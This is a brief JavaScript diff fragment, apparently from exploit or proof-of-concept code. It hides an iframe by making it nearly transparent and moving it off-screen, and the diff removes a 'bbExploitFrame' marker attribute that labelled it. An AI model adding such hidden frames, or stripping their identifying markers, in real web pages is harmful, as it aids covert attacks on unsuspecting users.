         frame.style.opacity = '0.01';
         frame.style.position = 'absolute';
         frame.style.left = '-9999px';
         frame.style.border = 'none';
-        frame.dataset.bbExploitFrame = '1';
         document.body.appendChild(frame);
       }, 0);
     }
